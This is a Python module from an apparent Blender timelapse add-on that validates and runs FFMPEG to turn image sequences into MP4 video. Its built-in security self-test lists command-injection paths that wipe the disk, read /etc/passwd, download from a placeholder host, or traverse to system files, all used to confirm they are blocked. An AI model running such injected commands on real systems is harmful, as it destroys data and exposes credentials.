"""
TIMELAPSE X - FFMPEG SECURITY FIX
"""

import bpy
import os
import logging
import subprocess
import urllib.request
import zipfile
import tempfile
import shlex
import hashlib
from datetime import datetime
from bpy.types import Operator
from bpy.props import StringProperty, IntProperty, BoolProperty
from pathlib import Path
from typing import Optional, List, Tuple

from .. import utils
from .. import state
from .. import constants

logger = logging.getLogger(__name__)


# ========================================================================================
# SECURITY: FFMPEG Validation & Sanitization
# ========================================================================================

class FFMPEGSecurityError(Exception):
    """Raised when FFMPEG security validation fails."""
    pass


class FFMPEGValidator:
    """
    FFMPEG security validator with command injection prevention.
    
    SECURITY FEATURES:
    - Path validation and sanitization
    - Executable verification
    - Argument whitelist
    - Input file validation
    - Command logging
    """
    
    # Whitelist of allowed FFMPEG arguments
    ALLOWED_ARGS = {
        '-f', '-safe', '-i', '-c:v', '-preset', '-crf', 
        '-pix_fmt', '-r', '-y', '-loglevel', '-threads',
        '-movflags', '-g', '-keyint_min', '-b:v'
    }
    
    # Whitelist of allowed codecs
    ALLOWED_CODECS = {
        'libx264', 'libx265', 'libvpx', 'libvpx-vp9'
    }
    
    # Whitelist of allowed presets
    ALLOWED_PRESETS = {
        'ultrafast', 'superfast', 'veryfast', 'faster', 'fast',
        'medium', 'slow', 'slower', 'veryslow'
    }
    
    # Whitelist of allowed pixel formats
    ALLOWED_PIXFMTS = {
        'yuv420p', 'yuv422p', 'yuv444p', 'rgb24', 'rgba'
    }
    
    def __init__(self):
        """Initialize validator."""
        self.verified_paths = {}  # Cache verified FFMPEG paths
    
    def validate_ffmpeg_path(self, ffmpeg_path: str) -> str:
        """
        Validate and sanitize FFMPEG executable path.
        
        SECURITY CHECKS:
        1. Path exists and is file
        2. File is executable
        3. File is actually FFMPEG (not malware)
        4. Path doesn't contain suspicious patterns
        
        Args:
            ffmpeg_path: Path to FFMPEG executable
        
        Returns:
            Absolute validated path
        
        Raises:
            FFMPEGSecurityError: If validation fails
        """
        if not ffmpeg_path:
            raise FFMPEGSecurityError("FFMPEG path is empty")
        
        # Check cache
        path_hash = hashlib.sha256(ffmpeg_path.encode()).hexdigest()
        if path_hash in self.verified_paths:
            cached_path = self.verified_paths[path_hash]
            if os.path.exists(cached_path):
                return cached_path
        
        # Resolve to absolute path
        try:
            abs_path = os.path.abspath(os.path.expanduser(ffmpeg_path))
        except Exception as e:
            raise FFMPEGSecurityError(f"Invalid path format: {e}")
        
        # Security: Check for path traversal
        if '..' in abs_path or abs_path.count(os.sep) > 20:
            raise FFMPEGSecurityError(
                f"Suspicious path detected: {abs_path}"
            )
        
        # Check exists
        if not os.path.exists(abs_path):
            raise FFMPEGSecurityError(
                f"FFMPEG not found: {abs_path}"
            )
        
        # Check is file (not directory or symlink to directory)
        if not os.path.isfile(abs_path):
            raise FFMPEGSecurityError(
                f"FFMPEG path is not a file: {abs_path}"
            )
        
        # Check executable permissions
        if not os.access(abs_path, os.X_OK):
            raise FFMPEGSecurityError(
                f"FFMPEG is not executable: {abs_path}"
            )
        
        # Security: Verify it's actually FFMPEG
        if not self._verify_ffmpeg_signature(abs_path):
            raise FFMPEGSecurityError(
                f"File is not a valid FFMPEG executable: {abs_path}"
            )
        
        # Cache verified path
        self.verified_paths[path_hash] = abs_path
        
        logger.info(f"FFMPEG validated: {abs_path}")
        return abs_path
    
    def _verify_ffmpeg_signature(self, path: str) -> bool:
        """
        Verify file is actually FFMPEG by running version check.
        
        SECURITY: Prevents executing arbitrary binaries
        
        Args:
            path: Path to check
        
        Returns:
            True if valid FFMPEG
        """
        try:
            # Run with timeout to prevent hanging
            result = subprocess.run(
                [path, '-version'],
                capture_output=True,
                timeout=5,
                text=True,
                encoding='utf-8',
                errors='replace'
            )
            
            # Check output contains FFMPEG signature
            output = result.stdout.lower()
            
            required_strings = ['ffmpeg version', 'configuration:', 'libavcodec']
            if all(s in output for s in required_strings):
                logger.debug(f"FFMPEG signature verified: {path}")
                return True
            
            logger.warning(f"Invalid FFMPEG signature: {path}")
            return False
        
        except subprocess.TimeoutExpired:
            logger.error(f"FFMPEG verification timeout: {path}")
            return False
        
        except Exception as e:
            logger.error(f"FFMPEG verification failed: {e}")
            return False
    
    def validate_input_file(self, file_path: str) -> str:
        """
        Validate input file path.
        
        SECURITY CHECKS:
        - File exists and is readable
        - Path doesn't contain command injection patterns
        - File has safe extension
        
        Args:
            file_path: Path to input file
        
        Returns:
            Absolute validated path
        
        Raises:
            FFMPEGSecurityError: If validation fails
        """
        if not file_path:
            raise FFMPEGSecurityError("Input file path is empty")
        
        # Get absolute path
        abs_path = os.path.abspath(file_path)
        
        # Security: Check for command injection patterns
        dangerous_chars = ['|', '&', ';', '$', '`', '\n', '\r']
        for char in dangerous_chars:
            if char in file_path:
                raise FFMPEGSecurityError(
                    f"Suspicious character in path: {repr(char)}"
                )
        
        # Check exists and readable
        if not os.path.exists(abs_path):
            raise FFMPEGSecurityError(f"File not found: {abs_path}")
        
        if not os.path.isfile(abs_path):
            raise FFMPEGSecurityError(f"Path is not a file: {abs_path}")
        
        if not os.access(abs_path, os.R_OK):
            raise FFMPEGSecurityError(f"File not readable: {abs_path}")
        
        return abs_path
    
    def validate_output_path(self, output_path: str) -> str:
        """
        Validate output file path.
        
        Args:
            output_path: Desired output path
        
        Returns:
            Absolute validated path
        
        Raises:
            FFMPEGSecurityError: If validation fails
        """
        if not output_path:
            raise FFMPEGSecurityError("Output path is empty")
        
        # Get absolute path
        abs_path = os.path.abspath(output_path)
        
        # Security: Check for dangerous characters
        dangerous_chars = ['|', '&', ';', '$', '`', '\n', '\r']
        for char in dangerous_chars:
            if char in output_path:
                raise FFMPEGSecurityError(
                    f"Suspicious character in path: {repr(char)}"
                )
        
        # Check parent directory exists
        parent = os.path.dirname(abs_path)
        if not os.path.exists(parent):
            raise FFMPEGSecurityError(
                f"Output directory does not exist: {parent}"
            )
        
        # Check parent is writable
        if not os.access(parent, os.W_OK):
            raise FFMPEGSecurityError(
                f"Output directory not writable: {parent}"
            )
        
        # Security: Check extension
        ext = os.path.splitext(abs_path)[1].lower()
        allowed_extensions = {'.mp4', '.mov', '.avi', '.mkv', '.webm'}
        if ext not in allowed_extensions:
            raise FFMPEGSecurityError(
                f"Unsafe output extension: {ext}. "
                f"Allowed: {', '.join(allowed_extensions)}"
            )
        
        return abs_path
    
    def build_safe_command(
        self,
        ffmpeg: str,
        input_file: str,
        output_file: str,
        fps: int = 30,
        codec: str = 'libx264',
        preset: str = 'medium',
        crf: int = 23,
        pixfmt: str = 'yuv420p'
    ) -> List[str]:
        """
        Build FFMPEG command with validation.
        
        SECURITY: All arguments are validated against whitelists
        
        Args:
            ffmpeg: Path to FFMPEG executable
            input_file: Input file list path
            output_file: Output video path
            fps: Frames per second
            codec: Video codec
            preset: Encoding preset
            crf: Constant rate factor
            pixfmt: Pixel format
        
        Returns:
            List of command arguments (safe for subprocess)
        
        Raises:
            FFMPEGSecurityError: If any argument fails validation
        """
        # Validate FFMPEG path
        ffmpeg = self.validate_ffmpeg_path(ffmpeg)
        
        # Validate input/output
        input_file = self.validate_input_file(input_file)
        output_file = self.validate_output_path(output_file)
        
        # Validate FPS
        if not (1 <= fps <= 240):
            raise FFMPEGSecurityError(f"Invalid FPS: {fps} (must be 1-240)")
        
        # Validate codec
        if codec not in self.ALLOWED_CODECS:
            raise FFMPEGSecurityError(
                f"Unsafe codec: {codec}. Allowed: {', '.join(self.ALLOWED_CODECS)}"
            )
        
        # Validate preset
        if preset not in self.ALLOWED_PRESETS:
            raise FFMPEGSecurityError(
                f"Invalid preset: {preset}. Allowed: {', '.join(self.ALLOWED_PRESETS)}"
            )
        
        # Validate CRF
        if not (0 <= crf <= 51):
            raise FFMPEGSecurityError(f"Invalid CRF: {crf} (must be 0-51)")
        
        # Validate pixel format
        if pixfmt not in self.ALLOWED_PIXFMTS:
            raise FFMPEGSecurityError(
                f"Invalid pixfmt: {pixfmt}. Allowed: {', '.join(self.ALLOWED_PIXFMTS)}"
            )
        
        # Build command - NO user input concatenation
        cmd = [
            ffmpeg,           # Validated executable
            '-f', 'concat',   # Format (hardcoded)
            '-safe', '0',     # Allow absolute paths (hardcoded)
            '-i', input_file, # Validated input
            '-c:v', codec,    # Validated codec
            '-preset', preset,# Validated preset
            '-crf', str(crf), # Validated CRF
            '-pix_fmt', pixfmt,# Validated pixfmt
            '-r', str(fps),   # Validated FPS
            '-movflags', '+faststart',  # MP4 optimization
            '-y',             # Overwrite (hardcoded)
            output_file       # Validated output
        ]
        
        # Log command (safely quoted)
        log_cmd = ' '.join(shlex.quote(arg) for arg in cmd)
        logger.info(f"FFMPEG command: {log_cmd}")
        
        return cmd
    
    def execute_safe_command(
        self,
        cmd: List[str],
        timeout: int = 300
    ) -> Tuple[bool, str]:
        """
        Execute FFMPEG command safely.
        
        Args:
            cmd: Command list from build_safe_command()
            timeout: Timeout in seconds
        
        Returns:
            Tuple of (success, error_message)
        """
        try:
            logger.info(f"Executing FFMPEG (timeout: {timeout}s)...")
            
            # Execute with timeout and capture output
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                encoding='utf-8',
                errors='replace',
                # SECURITY: Don't use shell=True
                shell=False
            )
            
            # Check return code
            if result.returncode != 0:
                error_msg = f"FFMPEG failed (code {result.returncode})"
                
                # Extract useful error from stderr
                if result.stderr:
                    # Get last 5 lines of stderr
                    error_lines = result.stderr.strip().split('\n')[-5:]
                    error_msg += f"\n{chr(10).join(error_lines)}"
                
                logger.error(error_msg)
                return False, error_msg
            
            logger.info("FFMPEG completed successfully")
            return True, ""
        
        except subprocess.TimeoutExpired:
            error_msg = f"FFMPEG timeout after {timeout}s"
            logger.error(error_msg)
            return False, error_msg
        
        except Exception as e:
            error_msg = f"FFMPEG execution error: {e}"
            logger.error(error_msg)
            return False, error_msg


# Global validator instance
_ffmpeg_validator = FFMPEGValidator()


# ========================================================================================
# SAFE: FFMPEG Discovery
# ========================================================================================

def find_ffmpeg_safe() -> Optional[str]:
    """
    Find FFMPEG executable safely.
    
    Search order:
    1. Blender's bundled FFMPEG
    2. System PATH
    3. Common installation locations
    
    Returns:
        Path to FFMPEG or None if not found
    """
    candidates = []
    
    # 1. Try Blender's bundled FFMPEG
    try:
        blender_dir = os.path.dirname(bpy.app.binary_path)
        bundled_paths = [
            os.path.join(blender_dir, 'ffmpeg.exe'),
            os.path.join(blender_dir, 'ffmpeg'),
            os.path.join(blender_dir, '..', 'ffmpeg.exe'),
            os.path.join(blender_dir, '..', 'ffmpeg'),
        ]
        candidates.extend(bundled_paths)
    except Exception as e:
        logger.debug(f"Cannot check Blender dir: {e}")
    
    # 2. Try system PATH
    try:
        # Use 'where' on Windows, 'which' on Unix
        import platform
        if platform.system() == 'Windows':
            result = subprocess.run(
                ['where', 'ffmpeg'],
                capture_output=True,
                timeout=5,
                text=True
            )
        else:
            result = subprocess.run(
                ['which', 'ffmpeg'],
                capture_output=True,
                timeout=5,
                text=True
            )
        
        if result.returncode == 0:
            path = result.stdout.strip().split('\n')[0]
            if path:
                candidates.append(path)
    except Exception as e:
        logger.debug(f"Cannot check system PATH: {e}")
    
    # 3. Common installation locations
    common_paths = [
        # Windows
        r'C:\ffmpeg\bin\ffmpeg.exe',
        r'C:\Program Files\ffmpeg\bin\ffmpeg.exe',
        r'C:\Program Files (x86)\ffmpeg\bin\ffmpeg.exe',
        # Unix/Linux
        '/usr/bin/ffmpeg',
        '/usr/local/bin/ffmpeg',
        '/opt/ffmpeg/bin/ffmpeg',
        # macOS
        '/opt/homebrew/bin/ffmpeg',
        '/usr/local/opt/ffmpeg/bin/ffmpeg',
    ]
    candidates.extend(common_paths)
    
    # Try each candidate
    for path in candidates:
        try:
            validated = _ffmpeg_validator.validate_ffmpeg_path(path)
            logger.info(f"Found FFMPEG: {validated}")
            return validated
        except FFMPEGSecurityError:
            continue
    
    logger.warning("FFMPEG not found")
    return None


# ========================================================================================
# Compilation Cleanup Manager
# ========================================================================================

class CompilationCleanupManager:
    """Manages cleanup of video compilation resources."""
    
    def __init__(self):
        self.loaded_images = []
        self.temp_files = []
        self._cleanup_attempted = False
    
    def register_image(self, img):
        """Register image for cleanup."""
        if img:
            self.loaded_images.append(img)
    
    def register_temp_file(self, filepath: str):
        """Register temporary file for cleanup."""
        if filepath:
            self.temp_files.append(filepath)
    
    def cleanup(self):
        """Perform guaranteed cleanup."""
        if self._cleanup_attempted:
            return
        
        self._cleanup_attempted = True
        logger.info("Starting cleanup...")
        
        # Remove loaded images
        for img in self.loaded_images:
            try:
                if img.name in bpy.data.images:
                    bpy.data.images.remove(img, do_unlink=True)
                    logger.debug(f"✓ Removed image: {img.name}")
            except:
                pass
        
        # Remove temp files
        for filepath in self.temp_files:
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
                    logger.debug(f"✓ Removed temp file: {filepath}")
            except Exception as e:
                logger.warning(f"Cannot remove temp file {filepath}: {e}")
        
        logger.info("Cleanup complete")


# ========================================================================================
# Helper Functions
# ========================================================================================

def _folder_has_images(path: str) -> bool:
    """Check if folder contains image files."""
    try:
        return any(
            f.lower().endswith(constants.IMAGE_EXTENSIONS)
            for f in os.listdir(path)
        )
    except (OSError, PermissionError):
        return False


def _find_images_folder(root_dir: str, max_depth: int = 3) -> str:
    """Recursively find folder with images."""
    root_dir = bpy.path.abspath(root_dir)
    
    if not os.path.isdir(root_dir):
        return None
    
    if _folder_has_images(root_dir):
        return root_dir
    
    def _search(current_dir: str, depth: int):
        if depth > max_depth:
            return None
        
        try:
            subdirs = [
                os.path.join(current_dir, d)
                for d in os.listdir(current_dir)
                if os.path.isdir(os.path.join(current_dir, d))
            ]
            subdirs.sort(reverse=True)
            
            for subdir in subdirs:
                if _folder_has_images(subdir):
                    return subdir
                
                result = _search(subdir, depth + 1)
                if result:
                    return result
        except (OSError, PermissionError):
            pass
        
        return None
    
    return _search(root_dir, 1)


def _compile_images_to_mp4_safe(
    image_dir: str,
    output_path: str,
    fps: int = 30,
    codec: str = 'libx264',
    preset: str = 'medium',
    crf: int = 23
):
    """
    Compile images to MP4 using SAFE FFMPEG execution.
    
    SECURITY: All inputs validated, no command injection possible
    
    Args:
        image_dir: Directory containing images
        output_path: Output MP4 path
        fps: Frames per second
        codec: Video codec
        preset: Encoding preset
        crf: Constant rate factor
    
    Raises:
        FFMPEGSecurityError: If security validation fails
        RuntimeError: If compilation fails
    """
    # Find images
    files = sorted([
        f for f in os.listdir(image_dir)
        if f.lower().endswith(constants.IMAGE_EXTENSIONS)
    ])
    
    if not files:
        raise RuntimeError("No images found in directory")
    
    logger.info(f"\n{'='*70}")
    logger.info(f"SAFE VIDEO COMPILATION")
    logger.info('='*70)
    logger.info(f"Input: {len(files)} images from {image_dir}")
    logger.info(f"Output: {output_path}")
    logger.info(f"FPS: {fps}, Codec: {codec}, Preset: {preset}, CRF: {crf}")
    logger.info('='*70 + "\n")
    
    cleanup_mgr = CompilationCleanupManager()
    filelist_path = None
    
    try:
        # Find FFMPEG
        ffmpeg = find_ffmpeg_safe()
        if not ffmpeg:
            raise RuntimeError(
                "FFMPEG not found.\n\n"
                "To enable video compilation:\n"
                "1. Download FFMPEG from: https://ffmpeg.org/download.html\n"
                "2. Extract and add to system PATH\n"
                "3. Or place ffmpeg.exe in Blender's folder\n\n"
                "Alternative: Export image sequences and use external video editor."
            )
        
        # Create file list for concat demuxer
        with tempfile.NamedTemporaryFile(
            mode='w',
            suffix='.txt',
            delete=False,
            encoding='utf-8'
        ) as f:
            filelist_path = f.name
            cleanup_mgr.register_temp_file(filelist_path)
            
            for filename in files:
                # SECURITY: Validate each file path
                filepath = os.path.join(image_dir, filename)
                try:
                    filepath = _ffmpeg_validator.validate_input_file(filepath)
                except FFMPEGSecurityError as e:
                    logger.warning(f"Skipping invalid file {filename}: {e}")
                    continue
                
                # Convert to forward slashes (FFMPEG requirement)
                filepath = filepath.replace('\\', '/')
                
                # Write to concat file
                f.write(f"file '{filepath}'\n")
                f.write(f"duration {1/fps}\n")
            
            # Last frame needs to be specified again for proper duration
            if files:
                last_file = os.path.join(image_dir, files[-1])
                last_file = _ffmpeg_validator.validate_input_file(last_file)
                last_file = last_file.replace('\\', '/')
                f.write(f"file '{last_file}'\n")
        
        logger.info(f"Created file list: {filelist_path}")
        
        # Build safe command
        cmd = _ffmpeg_validator.build_safe_command(
            ffmpeg=ffmpeg,
            input_file=filelist_path,
            output_file=bpy.path.abspath(output_path),
            fps=fps,
            codec=codec,
            preset=preset,
            crf=crf,
            pixfmt='yuv420p'
        )
        
        # Execute safely
        success, error_msg = _ffmpeg_validator.execute_safe_command(
            cmd,
            timeout=300
        )
        
        if not success:
            raise RuntimeError(f"FFMPEG encoding failed: {error_msg}")
        
        # Verify output
        output_abs = bpy.path.abspath(output_path)
        if not os.path.exists(output_abs):
            raise RuntimeError(f"Output file not created: {output_abs}")
        
        output_size = os.path.getsize(output_abs)
        logger.info(f"✓✓ Video created: {output_size / (1024*1024):.2f} MB")
        
        logger.info(f"\n{'='*70}")
        logger.info("✓✓ SAFE VIDEO COMPILATION COMPLETE ✓✓")
        logger.info('='*70 + "\n")
    
    finally:
        cleanup_mgr.cleanup()


# ========================================================================================
# Operators
# ========================================================================================

class TLX_OT_compile_video(Operator):
    """Compile image sequence to MP4 video using SAFE FFMPEG execution."""
    
    bl_idname = 'tlx.compile_video'
    bl_label = 'Make Video from Images (Safe)'
    bl_options = {'REGISTER'}
    
    input_dir: StringProperty(
        name='Images Folder',
        subtype='DIR_PATH',
        default='',
        description="Folder containing image sequence"
    )
    
    output_path: StringProperty(
        name='Video Output (MP4)',
        subtype='FILE_PATH',
        default='',
        description="Output MP4 file path"
    )
    
    filepath: StringProperty(subtype='FILE_PATH', default='', options={'HIDDEN'})
    directory: StringProperty(subtype='DIR_PATH', default='', options={'HIDDEN'})
    
    ask_output: BoolProperty(
        name='Choose Output via Dialog',
        default=False,
        description="Show file browser to select output location"
    )
    
    fps: IntProperty(
        name='FPS',
        min=1,
        max=240,
        default=constants.DEFAULT_VIDEO_FPS,
        description="Frames per second for output video"
    )
    
    stage: StringProperty(default='', options={'HIDDEN'})
    
    def invoke(self, context, event):
        prefs = utils.get_addon_preferences()
        
        if prefs and prefs.output_dir:
            self.input_dir = bpy.path.abspath(prefs.output_dir)
        else:
            self.input_dir = '//Timelapse_Images'
        
        self.stage = 'PICK_IMAGES'
        context.window_manager.fileselect_add(self)
        return {'RUNNING_MODAL'}
    
    def execute(self, context):
        if self.stage == 'PICK_IMAGES':
            candidate = bpy.path.abspath(
                self.directory or self.filepath or self.input_dir
            )
            
            if not os.path.isdir(candidate):
                self.report({'ERROR'}, f'Invalid folder: {candidate}')
                return {'CANCELLED'}
            
            self.input_dir = candidate
            logger.info(f"Selected images folder: {self.input_dir}")
            
            if self.ask_output:
                prefs = utils.get_addon_preferences()
                
                if prefs and prefs.mp4_output_mode == 'CUSTOM_DIR':
                    output_dir = bpy.path.abspath(prefs.mp4_custom_dir)
                else:
                    output_dir = self.input_dir
                
                os.makedirs(output_dir, exist_ok=True)
                self.output_path = os.path.join(output_dir, 'timelapse.mp4')
                
                self.stage = 'PICK_OUTPUT'
                context.window_manager.fileselect_add(self)
                return {'RUNNING_MODAL'}
            
            self.stage = ''
            return self._do_compile(context)
        
        elif self.stage == 'PICK_OUTPUT':
            if self.filepath:
                self.output_path = self.filepath
            
            logger.info(f"Selected output path: {self.output_path}")
            
            self.stage = ''
            return self._do_compile(context)
        
        else:
            return self._do_compile(context)
    
    def _do_compile(self, context):
        images_folder = _find_images_folder(self.input_dir)
        
        if not images_folder:
            msg = f'No images found under: {self.input_dir}'
            logger.warning(msg)
            self.report({'ERROR'}, msg)
            return {'CANCELLED'}
        
        files = sorted([
            f for f in os.listdir(images_folder)
            if f.lower().endswith(constants.IMAGE_EXTENSIONS)
        ])
        
        if not files:
            msg = 'No images found in selected folder'
            logger.warning(msg)
            self.report({'ERROR'}, msg)
            return {'CANCELLED'}
        
        logger.info(f"Found {len(files)} images in {images_folder}")
        
        output_path = bpy.path.abspath(self.output_path) if self.output_path else ''
        
        if not output_path:
            base_name = os.path.basename(os.path.normpath(images_folder)) or 'timelapse'
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_path = os.path.join(images_folder, f'{base_name}_{timestamp}.mp4')
        
        if not output_path.lower().endswith('.mp4'):
            output_path += '.mp4'
        
        output_dir = os.path.dirname(output_path)
        if output_dir:
            try:
                os.makedirs(output_dir, exist_ok=True)
            except OSError as e:
                msg = f'Cannot create output directory: {e}'
                logger.error(msg)
                self.report({'ERROR'}, msg)
                return {'CANCELLED'}
        
        try:
            # Use SAFE compilation
            _compile_images_to_mp4_safe(
                images_folder,
                output_path,
                fps=self.fps,
                codec='libx264',
                preset='medium',
                crf=23
            )
            
            duration = len(files) / self.fps
            output_size = os.path.getsize(bpy.path.abspath(output_path))
            size_mb = output_size / (1024 * 1024)
            
            msg = (f'✓ Video exported successfully!\n'
                   f'Duration: {duration:.1f}s | '
                   f'Size: {size_mb:.1f}MB | '
                   f'SECURITY: Validated')
            
            self.report({'INFO'}, msg)
            logger.info(f"Safe video compilation succeeded: {output_path}")
            
            return {'FINISHED'}
        
        except FFMPEGSecurityError as e:
            msg = f'SECURITY ERROR: {e}'
            logger.error(msg)
            self.report({'ERROR'}, msg)
            return {'CANCELLED'}
        
        except Exception as e:
            msg = str(e)
            logger.error(msg, exc_info=True)
            
            # User-friendly error messages
            if "FFMPEG not found" in msg:
                self.report({'ERROR'}, 
                    'FFMPEG not found. Please install FFMPEG.\n'
                    'Download from: https://ffmpeg.org/download.html'
                )
            else:
                self.report({'ERROR'}, f'Compilation failed: {msg}')
            
            return {'CANCELLED'}


class TLX_OT_compile_session_all(Operator):
    """Auto-compile all cameras from current session using SAFE FFMPEG."""
    
    bl_idname = 'tlx.compile_session_all'
    bl_label = 'Compile Current Session (All Cameras - Safe)'
    bl_options = {'REGISTER'}
    
    fps: IntProperty(
        name='FPS',
        min=1,
        max=240,
        default=constants.DEFAULT_VIDEO_FPS,
        description="Frames per second for output videos"
    )
    
    @classmethod
    def poll(cls, context):
        session_dir = state.TLX_State.session_dir
        return bool(session_dir and os.path.isdir(session_dir))
    
    def execute(self, context):
        prefs = utils.get_addon_preferences()
        session_dir = state.TLX_State.session_dir
        
        if not (session_dir and os.path.isdir(session_dir)):
            msg = 'No active session folder'
            logger.warning(msg)
            self.report({'ERROR'}, msg)
            return {'CANCELLED'}
        
        logger.info(f"Compiling session: {session_dir}")
        
        camera_dirs = []
        try:
            for item in os.listdir(session_dir):
                path = os.path.join(session_dir, item)
                
                if (os.path.isdir(path) and 
                    item.startswith('CAM_') and 
                    _folder_has_images(path)):
                    camera_dirs.append(path)
        
        except (OSError, PermissionError) as e:
            logger.error(f"Cannot read session directory: {e}")
        
        flat_session = _folder_has_images(session_dir)
        
        def _get_output_dir(base):
            if prefs and prefs.mp4_output_mode == 'CUSTOM_DIR':
                return utils.ensure_directory(prefs.mp4_custom_dir)
            return utils.ensure_directory(base)
        
        date_dir = os.path.basename(os.path.dirname(session_dir)) or 'session'
        time_dir = os.path.basename(session_dir) or 'time'
        tag = f"{date_dir}_{time_dir}"
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        if camera_dirs:
            targets = camera_dirs
            logger.info(f"Found {len(camera_dirs)} camera folders")
        elif flat_session:
            targets = [session_dir]
            logger.info("Found flat session")
        else:
            targets = []
        
        if not targets:
            msg = 'No camera folders or images to compile'
            self.report({'ERROR'}, msg)
            return {'CANCELLED'}
        
        exported_count = 0
        failed_count = 0
        security_errors = 0
        
        for target_dir in sorted(targets):
            folder_name = os.path.basename(target_dir)
            output_path = os.path.join(
                _get_output_dir(target_dir),
                f"{tag}_{folder_name}_{timestamp}.mp4"
            )
            
            try:
                logger.info(f"Compiling {folder_name}...")
                
                # Use SAFE compilation
                _compile_images_to_mp4_safe(
                    target_dir,
                    output_path,
                    fps=self.fps,
                    codec='libx264',
                    preset='medium',
                    crf=23
                )
                
                exported_count += 1
                logger.info(f"✓ Compiled {folder_name}")
            
            except FFMPEGSecurityError as e:
                security_errors += 1
                failed_count += 1
                logger.error(f"✗ SECURITY ERROR in {folder_name}: {e}")
                
                if security_errors == 1:
                    self.report({'ERROR'}, f"Security error: {e}")
            
            except Exception as e:
                failed_count += 1
                logger.error(f"✗ Failed: {folder_name}: {e}")
                
                # Show user-friendly error for first failure
                if failed_count == 1 and "FFMPEG not found" in str(e):
                    self.report({'WARNING'}, 
                        'FFMPEG not found. Install FFMPEG to enable video compilation.\n'
                        'Download: https://ffmpeg.org/download.html'
                    )
                else:
                    self.report({'WARNING'}, f"Failed: {folder_name}")
        
        if exported_count == 0:
            msg = 'No MP4s exported (all failed - check console)'
            self.report({'ERROR'}, msg)
            return {'CANCELLED'}
        
        msg = f'✓ Exported {exported_count} MP4(s) (SAFE MODE)'
        if failed_count > 0:
            msg += f' ({failed_count} failed'
            if security_errors > 0:
                msg += f', {security_errors} security errors'
            msg += ')'
        
        self.report({'INFO'}, msg)
        
        return {'FINISHED'}


class TLX_OT_test_ffmpeg_security(Operator):
    """Test FFMPEG security validation (Debug Tool)."""
    
    bl_idname = 'tlx.test_ffmpeg_security'
    bl_label = 'Test FFMPEG Security'
    bl_options = {'REGISTER'}
    
    def execute(self, context):
        """Run security tests."""
        logger.info("\n" + "="*70)
        logger.info("FFMPEG SECURITY TEST")
        logger.info("="*70)
        
        results = []
        
        # Test 1: Find FFMPEG
        try:
            ffmpeg = find_ffmpeg_safe()
            if ffmpeg:
                results.append(("✓ FFMPEG Found", ffmpeg))
            else:
                results.append(("✗ FFMPEG Not Found", "Install FFMPEG"))
        except Exception as e:
            results.append(("✗ FFMPEG Search Failed", str(e)))
        
        # Test 2: Path validation
        try:
            # Test valid path
            _ffmpeg_validator.validate_input_file(__file__)
            results.append(("✓ Valid Path Accepted", "OK"))
        except Exception as e:
            results.append(("✗ Valid Path Rejected", str(e)))
        
        # Test 3: Malicious path rejection
        malicious_paths = [
            "/tmp/test | rm -rf /",
            "/tmp/test; cat /etc/passwd",
            "/tmp/test && wget malware.com",
            "../../../etc/passwd",
        ]
        
        blocked = 0
        for mal_path in malicious_paths:
            try:
                _ffmpeg_validator.validate_input_file(mal_path)
                results.append(("✗ SECURITY BREACH", f"Accepted: {mal_path}"))
            except FFMPEGSecurityError:
                blocked += 1
        
        if blocked == len(malicious_paths):
            results.append(("✓ Malicious Paths Blocked", f"{blocked}/{len(malicious_paths)}"))
        else:
            results.append(("✗ Security Weakness", f"Only blocked {blocked}/{len(malicious_paths)}"))
        
        # Test 4: Command building
        try:
            if ffmpeg:
                cmd = _ffmpeg_validator.build_safe_command(
                    ffmpeg=ffmpeg,
                    input_file=__file__,
                    output_file="/tmp/test.mp4",
                    fps=30
                )
                results.append(("✓ Safe Command Built", f"{len(cmd)} args"))
        except Exception as e:
            results.append(("✗ Command Build Failed", str(e)))
        
        # Print results
        logger.info("\nTest Results:")
        for status, detail in results:
            logger.info(f"  {status}: {detail}")
        
        logger.info("="*70 + "\n")
        
        # Report to user
        passed = sum(1 for s, _ in results if s.startswith("✓"))
        total = len(results)
        
        if passed == total:
            self.report({'INFO'}, f'✓ All {total} security tests passed')
        else:
            self.report({'WARNING'}, f'⚠ {passed}/{total} tests passed - check console')
        
        return {'FINISHED'}


# ========================================================================================
# Registration
# ========================================================================================

classes = (
    TLX_OT_compile_video,
    TLX_OT_compile_session_all,
    TLX_OT_test_ffmpeg_security,
)


def register():
    logger.info("Registering video operators (SAFE FFMPEG with Security)")
    
    for cls in classes:
        try:
            bpy.utils.register_class(cls)
            logger.info(f"Registered: {cls.__name__}")
        except Exception as e:
            logger.error(f"Failed to register {cls.__name__}: {e}")
    
    # Test FFMPEG on startup
    try:
        ffmpeg = find_ffmpeg_safe()
        if ffmpeg:
            logger.info(f"✓ FFMPEG ready: {ffmpeg}")
        else:
            logger.warning("⚠ FFMPEG not found - video compilation will fail")
    except Exception as e:
        logger.error(f"FFMPEG test failed: {e}")


def unregister():
    logger.info("Unregistering video operators")
    
    for cls in reversed(classes):
        try:
            bpy.utils.unregister_class(cls)
        except Exception as e:
            logger.warning(f"Failed to unregister {cls.__name__}: {e}")